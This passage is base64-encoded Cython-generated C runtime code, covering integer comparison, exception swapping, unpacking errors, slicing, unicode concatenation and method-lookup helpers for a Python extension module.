B5eF9QeUxvbmdfSXNaZXJvKG9wMSkgIT0gMSk7CiAgICAgICAgfSBlbHNlIGlmIChpbnR2YWwgPCAwKSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNOb25OZWcob3AxKSkKICAgICAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgICAgICBpbnR2YWwgPSAtaW50dmFsOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNOZWcob3AxKSkKICAgICAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICB1aW50dmFsID0gKHVuc2lnbmVkIGxvbmcpIGludHZhbDsKI2lmIFB5TG9uZ19TSElGVCAqIDQgPCBTSVpFT0ZfTE9ORyo4CiAgICAgICAgaWYgKHVpbnR2YWwgPj4gKFB5TG9uZ19TSElGVCAqIDQpKSB7CiAgICAgICAgICAgIHVuZXF1YWwgPSAoc2l6ZSAhPSA1KSB8fCAoZGlnaXRzWzBdICE9ICh1aW50dmFsICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkKICAgICAgICAgICAgICAgICB8IChkaWdpdHNbMV0gIT0gKCh1aW50dmFsID4+ICgxICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKSB8IChkaWdpdHNbMl0gIT0gKCh1aW50dmFsID4+ICgyICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKSB8IChkaWdpdHNbM10gIT0gKCh1aW50dmFsID4+ICgzICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKSB8IChkaWdpdHNbNF0gIT0gKCh1aW50dmFsID4+ICg0ICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKTsKICAgICAgICB9IGVsc2UKI2VuZGlmCiNpZiBQeUxvbmdfU0hJRlQgKiAzIDwgU0laRU9GX0xPTkcqOAogICAgICAgIGlmICh1aW50dmFsID4+IChQeUxvbmdfU0hJRlQgKiAzKSkgewogICAgICAgICAgICB1bmVxdWFsID0gKHNpemUgIT0gNCkgfHwgKGRpZ2l0c1swXSAhPSAodWludHZhbCAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpCiAgICAgICAgICAgICAgICAgfCAoZGlnaXRzWzFdICE9ICgodWludHZhbCA+PiAoMSAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkgfCAoZGlnaXRzWzJdICE9ICgodWludHZhbCA+PiAoMiAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkgfCAoZGlnaXRzWzNdICE9ICgodWludHZhbCA+PiAoMyAqIFB5TG9uZ19TSElGVCkpICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSk7CiAgICAgICAgfSBlbHNlCiNlbmRpZgojaWYgUHlMb25nX1NISUZUICogMiA8IFNJWkVPRl9MT05HKjgKICAgICAgICBpZiAodWludHZhbCA+PiAoUHlMb25nX1NISUZUICogMikpIHsKICAgICAgICAgICAgdW5lcXVhbCA9IChzaXplICE9IDMpIHx8IChkaWdpdHNbMF0gIT0gKHVpbnR2YWwgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKQogICAgICAgICAgICAgICAgIHwgKGRpZ2l0c1sxXSAhPSAoKHVpbnR2YWwgPj4gKDEgKiBQeUxvbmdfU0hJRlQpKSAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpIHwgKGRpZ2l0c1syXSAhPSAoKHVpbnR2YWwgPj4gKDIgKiBQeUxvbmdfU0hJRlQpKSAmICh1bnNpZ25lZCBsb25nKSBQeUxvbmdfTUFTSykpOwogICAgICAgIH0gZWxzZQojZW5kaWYKI2lmIFB5TG9uZ19TSElGVCAqIDEgPCBTSVpFT0ZfTE9ORyo4CiAgICAgICAgaWYgKHVpbnR2YWwgPj4gKFB5TG9uZ19TSElGVCAqIDEpKSB7CiAgICAgICAgICAgIHVuZXF1YWwgPSAoc2l6ZSAhPSAyKSB8fCAoZGlnaXRzWzBdICE9ICh1aW50dmFsICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSkKICAgICAgICAgICAgICAgICB8IChkaWdpdHNbMV0gIT0gKCh1aW50dmFsID4+ICgxICogUHlMb25nX1NISUZUKSkgJiAodW5zaWduZWQgbG9uZykgUHlMb25nX01BU0spKTsKICAgICAgICB9IGVsc2UKI2VuZGlmCiAgICAgICAgICAgIHVuZXF1YWwgPSAoc2l6ZSAhPSAxKSB8fCAoKCh1bnNpZ25lZCBsb25nKSBkaWdpdHNbMF0pICE9ICh1aW50dmFsICYgKHVuc2lnbmVkIGxvbmcpIFB5TG9uZ19NQVNLKSk7CiAgICAgICAgcmV0dXJuICh1bmVxdWFsICE9IDApOwogICAgfQogICAgI2VuZGlmCiAgICBpZiAoUHlGbG9hdF9DaGVja0V4YWN0KG9wMSkpIHsKICAgICAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7CiAgICAgICAgZG91YmxlIGEgPSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRShvcDEpOwogICAgICAgIHJldHVybiAoKGRvdWJsZSlhICE9IChkb3VibGUpYik7CiAgICB9CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfSXNUcnVlQW5kRGVjcmVmKAogICAgICAgIFB5T2JqZWN0X1JpY2hDb21wYXJlKG9wMSwgb3AyLCBQeV9ORSkpOwp9CgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25Td2FwKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7CiAgICBpZiAodG1wX3ZhbHVlID09IE5VTEwgfHwgdG1wX3ZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICAgICAgdG1wX3ZhbHVlID0gTlVMTDsKICAgICAgICB0bXBfdHlwZSA9IE5VTEw7CiAgICAgICAgdG1wX3RiID0gTlVMTDsKICAgIH0gZWxzZSB7CiAgICAgICAgdG1wX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHRtcF92YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKHRtcF90eXBlKTsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgdG1wX3RiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSB0bXBfdmFsdWUpLT50cmFjZWJhY2s7CiAgICAgICAgUHlfWElOQ1JFRih0bXBfdGIpOwogICAgICAgICNlbHNlCiAgICAgICAgdG1wX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKHRtcF92YWx1ZSk7CiAgICAgICAgI2VuZGlmCiAgICB9CiAgI2VsaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSAqdHlwZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7CiAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9ICp0YjsKICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gKnR5cGU7CiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9ICp2YWx1ZTsKICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9ICp0YjsKICAjZW5kaWYKICAgICp0eXBlID0gdG1wX3R5cGU7CiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7CiAgICAqdGIgPSB0bXBfdGI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikgewogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICAgUHlFcnJfR2V0RXhjSW5mbygmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpOwogICAgUHlFcnJfU2V0RXhjSW5mbygqdHlwZSwgKnZhbHVlLCAqdGIpOwogICAgKnR5cGUgPSB0bXBfdHlwZTsKICAgICp2YWx1ZSA9IHRtcF92YWx1ZTsKICAgICp0YiA9IHRtcF90YjsKfQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgZXhwZWN0ZWQpIHsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19WYWx1ZUVycm9yLAogICAgICAgICAgICAgICAgICJ0b28gbWFueSB2YWx1ZXMgdG8gdW5wYWNrIChleHBlY3RlZCAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQpIiwgZXhwZWN0ZWQpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoUHlfc3NpemVfdCBpbmRleCkgewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1ZhbHVlRXJyb3IsCiAgICAgICAgICAgICAgICAgIm5lZWQgbW9yZSB0aGFuICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCB2YWx1ZSUuMXMgdG8gdW5wYWNrIiwKICAgICAgICAgICAgICAgICBpbmRleCwgKGluZGV4ID09IDEpID8gIiIgOiAicyIpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0l0ZXJGaW5pc2godm9pZCkgewogICAgUHlPYmplY3QqIGV4Y190eXBlOwogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgZXhjX3R5cGUgPSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpOwogICAgaWYgKHVubGlrZWx5KGV4Y190eXBlKSkgewogICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soUHlPYmplY3QgKnJldHZhbCwgUHlfc3NpemVfdCBleHBlY3RlZCkgewogICAgaWYgKHVubGlrZWx5KHJldHZhbCkpIHsKICAgICAgICBQeV9ERUNSRUYocmV0dmFsKTsKICAgICAgICBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihleHBlY3RlZCk7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0l0ZXJGaW5pc2goKTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRTbGljZShQeU9iamVjdCogb2JqLAogICAgICAgIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLAogICAgICAgIFB5T2JqZWN0KiogX3B5X3N0YXJ0LCBQeU9iamVjdCoqIF9weV9zdG9wLCBQeU9iamVjdCoqIF9weV9zbGljZSwKICAgICAgICBpbnQgaGFzX2NzdGFydCwgaW50IGhhc19jc3RvcCwgQ1lUSE9OX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCkgewogICAgX19QeXhfVHlwZU5hbWUgb2JqX3R5cGVfbmFtZTsKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgUHlNYXBwaW5nTWV0aG9kcyogbXAgPSBQeV9UWVBFKG9iaiktPnRwX2FzX21hcHBpbmc7CiAgICBpZiAobGlrZWx5KG1wICYmIG1wLT5tcF9zdWJzY3JpcHQpKQojZW5kaWYKICAgIHsKICAgICAgICBQeU9iamVjdCogcmVzdWx0OwogICAgICAgIFB5T2JqZWN0ICpweV9zbGljZSwgKnB5X3N0YXJ0LCAqcHlfc3RvcDsKICAgICAgICBpZiAoX3B5X3NsaWNlKSB7CiAgICAgICAgICAgIHB5X3NsaWNlID0gKl9weV9zbGljZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RhcnQgPSBOVUxMOwogICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RvcCA9IE5VTEw7CiAgICAgICAgICAgIGlmIChfcHlfc3RhcnQpIHsKICAgICAgICAgICAgICAgIHB5X3N0YXJ0ID0gKl9weV9zdGFydDsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChoYXNfY3N0YXJ0KSB7CiAgICAgICAgICAgICAgICAgICAgb3duZWRfc3RhcnQgPSBweV9zdGFydCA9IFB5TG9uZ19Gcm9tU3NpemVfdChjc3RhcnQpOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhcnQpKSBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgICAgIHB5X3N0YXJ0ID0gUHlfTm9uZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoX3B5X3N0b3ApIHsKICAgICAgICAgICAgICAgIHB5X3N0b3AgPSAqX3B5X3N0b3A7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoaGFzX2NzdG9wKSB7CiAgICAgICAgICAgICAgICAgICAgb3duZWRfc3RvcCA9IHB5X3N0b3AgPSBQeUxvbmdfRnJvbVNzaXplX3QoY3N0b3ApOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RvcCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdGFydCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgICAgIHB5X3N0b3AgPSBQeV9Ob25lOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHB5X3NsaWNlID0gUHlTbGljZV9OZXcocHlfc3RhcnQsIHB5X3N0b3AsIFB5X05vbmUpOwogICAgICAgICAgICBQeV9YREVDUkVGKG93bmVkX3N0YXJ0KTsKICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdG9wKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweV9zbGljZSkpIGdvdG8gYmFkOwogICAgICAgIH0KI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgICAgIHJlc3VsdCA9IG1wLT5tcF9zdWJzY3JpcHQob2JqLCBweV9zbGljZSk7CiNlbHNlCiAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShvYmosIHB5X3NsaWNlKTsKI2VuZGlmCiAgICAgICAgaWYgKCFfcHlfc2xpY2UpIHsKICAgICAgICAgICAgUHlfREVDUkVGKHB5X3NsaWNlKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIG9ial90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUob2JqKSk7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICInIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgb2JqZWN0IGlzIHVuc2xpY2VhYmxlIiwgb2JqX3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqX3R5cGVfbmFtZSk7CmJhZDoKICAgIHJldHVybiBOVUxMOwp9CgoKIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIGludApfX1B5eF91bmljb2RlX21vZGlmaWFibGUoUHlPYmplY3QgKnVuaWNvZGUpCnsKICAgIGlmIChQeV9SRUZDTlQodW5pY29kZSkgIT0gMSkKICAgICAgICByZXR1cm4gMDsKICAgIGlmICghUHlVbmljb2RlX0NoZWNrRXhhY3QodW5pY29kZSkpCiAgICAgICAgcmV0dXJuIDA7CiAgICBpZiAoUHlVbmljb2RlX0NIRUNLX0lOVEVSTkVEKHVuaWNvZGUpKQogICAgICAgIHJldHVybiAwOwogICAgcmV0dXJuIDE7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbChQeU9iamVjdCAqKnBfbGVmdCwgUHlPYmplY3QgKnJpZ2h0CiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWQogICAgICAgICwgdm9pZCogX19weXhfcmVmbmFubnkKICAgICAgICAjZW5kaWYKICAgICkgewogICAgUHlPYmplY3QgKmxlZnQgPSAqcF9sZWZ0OwogICAgUHlfc3NpemVfdCBsZWZ0X2xlbiwgcmlnaHRfbGVuLCBuZXdfbGVuOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShsZWZ0KSA9PSAtMSkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHJpZ2h0KSA9PSAtMSkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBsZWZ0X2xlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKGxlZnQpOwogICAgaWYgKGxlZnRfbGVuID09IDApIHsKICAgICAgICBQeV9JTkNSRUYocmlnaHQpOwogICAgICAgIHJldHVybiByaWdodDsKICAgIH0KICAgIHJpZ2h0X2xlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHJpZ2h0KTsKICAgIGlmIChyaWdodF9sZW4gPT0gMCkgewogICAgICAgIFB5X0lOQ1JFRihsZWZ0KTsKICAgICAgICByZXR1cm4gbGVmdDsKICAgIH0KICAgIGlmICh1bmxpa2VseShsZWZ0X2xlbiA+IFBZX1NTSVpFX1RfTUFYIC0gcmlnaHRfbGVuKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAic3RyaW5ncyBhcmUgdG9vIGxhcmdlIHRvIGNvbmNhdCIpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgbmV3X2xlbiA9IGxlZnRfbGVuICsgcmlnaHRfbGVuOwogICAgaWYgKF9fUHl4X3VuaWNvZGVfbW9kaWZpYWJsZShsZWZ0KQogICAgICAgICAgICAmJiBQeVVuaWNvZGVfQ2hlY2tFeGFjdChyaWdodCkKICAgICAgICAgICAgJiYgUHlVbmljb2RlX0tJTkQocmlnaHQpIDw9IFB5VW5pY29kZV9LSU5EKGxlZnQpCiAgICAgICAgICAgICYmICEoUHlVbmljb2RlX0lTX0FTQ0lJKGxlZnQpICYmICFQeVVuaWNvZGVfSVNfQVNDSUkocmlnaHQpKSkgewogICAgICAgIGludCByZXQ7CiAgICAgICAgX19QeXhfR0lWRVJFRigqcF9sZWZ0KTsKICAgICAgICByZXQgPSBQeVVuaWNvZGVfUmVzaXplKHBfbGVmdCwgbmV3X2xlbik7CiAgICAgICAgX19QeXhfR09UUkVGKCpwX2xlZnQpOwogICAgICAgIGlmICh1bmxpa2VseShyZXQgIT0gMCkpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgaWYgKHVubGlrZWx5KFB5VW5pY29kZV9Db3B5Q2hhcmFjdGVycygqcF9sZWZ0LCBsZWZ0X2xlbiwgcmlnaHQsIDAsIHJpZ2h0X2xlbikgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2Vsc2UKICAgICAgICBfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycygqcF9sZWZ0LCBsZWZ0X2xlbiwgcmlnaHQsIDAsIHJpZ2h0X2xlbik7CiAgICAgICAgI2VuZGlmCiAgICAgICAgX19QeXhfSU5DUkVGKCpwX2xlZnQpOwogICAgICAgIF9fUHl4X0dJVkVSRUYoKnBfbGVmdCk7CiAgICAgICAgcmV0dXJuICpwX2xlZnQ7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGxlZnQsIHJpZ2h0KTsKICAgIH0KICB9CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcoUHlPYmplY3QgKmZ1bmMpIHsKICAgIFB5T2JqZWN0ICphcmdbMl0gPSB7TlVMTCwgTlVMTH07CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJnICsgMSwgMCB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKiptZXRob2QpIHsKICAgIFB5T2JqZWN0ICphdHRyOwojaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTICYmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAgIF9fUHl4X1R5cGVOYW1lIHR5cGVfbmFtZTsKICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7CiAgICBQeU9iamVjdCAqZGVzY3I7CiAgICBkZXNjcmdldGZ1bmMgZiA9IE5VTEw7CiAgICBQeU9iamVjdCAqKmRpY3RwdHIsICpkaWN0OwogICAgaW50IG1ldGhfZm91bmQgPSAwOwogICAgYXNzZXJ0ICgqbWV0aG9kID09IE5VTEwpOwogICAgaWYgKHVubGlrZWx5KHRwLT50cF9nZXRhdHRybyAhPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgICAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpOwogICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgIH0KICAgIGlmICh1bmxpa2VseSh0cC0+dHBfZGljdCA9PSBOVUxMKSAmJiB1bmxpa2VseShQeVR5cGVfUmVhZHkodHApIDwgMCkpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIGRlc2NyID0gX1B5VHlwZV9Mb29rdXAodHAsIG5hbWUpOwogICAgaWYgKGxpa2VseShkZXNjciAhPSBOVUxMKSkgewogICAgICAgIFB5X0lOQ1JFRihkZXNjcik7CiNpZiBkZWZpbmVkKFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IpICYmIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IKICAgICAgICBpZiAoX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShkZXNjciksIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IpKQojZWxzZQogICAgICAgICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICAgICAgICBpZiAobGlrZWx5KFB5RnVuY3Rpb25fQ2hlY2soZGVzY3IpIHx8IF9fUHl4X0lTX1RZUEUoZGVzY3IsICZQeU1ldGhvZERlc2NyX1R5cGUpIHx8IF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2soZGVzY3IpKSkKICAgICAgICAjZWxzZQogICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkpKQogICAgICAgICNlbmRpZgojZW5kaWYKICAgICAgICB7CiAgICAgICAgICAgIG1ldGhfZm91bmQgPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGYgPSBQeV9UWVBFKGRlc2NyKS0+dHBfZGVzY3JfZ2V0OwogICAgICAgICAgICBpZiAoZiAhPSBOVUxMICYmIFB5RGVzY3JfSXNEYXRhKGRlc2NyKSkgewogICAgICAgICAgICAgICAgYXR0ciA9IGYoZGVzY3IsIG9iaiwgKFB5T2JqZWN0ICopUHlfVFlQRShvYmopKTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICBnb3RvIHRyeV91bnBhY2s7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBkaWN0cHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTsKICAgIGlmIChkaWN0cHRyICE9IE5VTEwgJiYgKGRpY3QgPSAqZGljdHB0cikgIT0gTlVMTCkgewogICAgICAgIFB5X0lOQ1JFRihkaWN0KTsKICAgICAgICBhdHRyID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIoZGljdCwgbmFtZSk7CiAgICAgICAgaWYgKGF0dHIgIT0gTlVMTCkgewogICAgICAgICAgICBQeV9JTkNSRUYoYXR0cik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWN0KTsKICAgICAgICAgICAgUHlfWERFQ1JFRihkZXNjcik7CiAgICAgICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKGRpY3QpOwogICAgfQogICAgaWYgKG1ldGhfZm91bmQpIHsKICAgICAgICAqbWV0aG9kID0gZGVzY3I7CiAgICAgICAgcmV0dXJuIDE7CiAgICB9CiAgICBpZiAoZiAhPSBOVUxMKSB7CiAgICAgICAgYXR0ciA9IGYoZGVzY3IsIG9iaiwgKFB5T2JqZWN0ICopUHlfVFlQRShvYmopKTsKICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgIH0KICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHsKICAgICAgICAqbWV0aG9kID0gZGVzY3I7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICB0eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19BdHRyaWJ1dGVFcnJvciwKICAgICAgICAgICAgICAgICAiJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIG9iamVjdCBoYXMgbm8gYXR0cmlidXRlICclVSciLAogICAgICAgICAgICAgICAgIHR5cGVfbmFtZSwgbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUodHlwZV9uYW1lKTsKICAgIHJldHVybiAwOwojZWxzZQogICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTsKICAgIGdvdG8gdHJ5X3VucGFjazsKI2VuZGlmCnRyeV91bnBhY2s6CiNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmIChsaWtlbHkoYXR0cikgJiYgUHlNZXRob2RfQ2hlY2soYXR0cikgJiYgbGlrZWx5KFB5TWV0aG9kX0dFVF9TRUxGKGF0dHIpID09IG9iaikpIHsKICAgICAgICBQeU9iamVjdCAqZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oYXR0cik7CiAgICAgICAgUHlfSU5DUkVGKGZ1bmN0aW9uKTsKICAgICAgICBQeV9ERUNSRUYoYXR0cik7